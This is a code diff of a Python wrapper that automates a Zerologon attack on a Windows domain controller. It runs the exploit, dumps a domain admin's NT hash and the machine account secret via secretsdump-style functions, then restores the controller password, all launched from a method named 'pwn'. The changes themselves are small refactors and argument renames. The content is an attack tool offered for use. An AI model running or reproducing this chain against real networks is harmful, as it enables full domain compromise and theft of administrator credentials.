@@ -20,18 +20,12 @@ class wrapper():
         # Zerologon exploit
         exploit = zerologon(self.dc_ip, self.dc.rstrip('$'))
         exploit.perform_attack()
-
-        # LDAP query first enabled domain admins
-        #ldapquery = LDAPQuery(self.domain, self.dc)
-        #domain_Admin = ldapquery.getFirstDomainAdmins()
-        #print(domain_Admin)
         
         # Dump first domain admin nthash
         secretsdump = dump(dc_ip=self.dc_ip, dc=self.dc, domain=self.domain, kdcHost=self.kdcHost)
         username, nthash = secretsdump.NTDSDump_BlankPass()
         
         # Get Machine account hexpass
-        secretsdump = dump(dc_ip=self.dc_ip, dc=self.dc, domain=self.domain, kdcHost=self.kdcHost)
         hexpass = secretsdump.LSADump(username=username, nthash=nthash)
 
         # Restore machine account password
@@ -41,11 +35,11 @@ class wrapper():
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(add_help=True, description="Zerologon with restore DC password automatically.")
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
-    parser.add_argument('-target-ip', metavar = "ip address", action='store', help='IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it')
+    parser.add_argument('-dc-ip', metavar = "ip address", action='store', help='IP Address of the domain controller. If ommited it use the ip part specified in the target parameter')
 
     options = parser.parse_args()
 
     domain, username, password, address = parse_target(options.target)
 
-    executer = wrapper(username, address, domain, options.target_ip)
+    executer = wrapper(username, address, domain, options.dc_ip)
     executer.pwn()
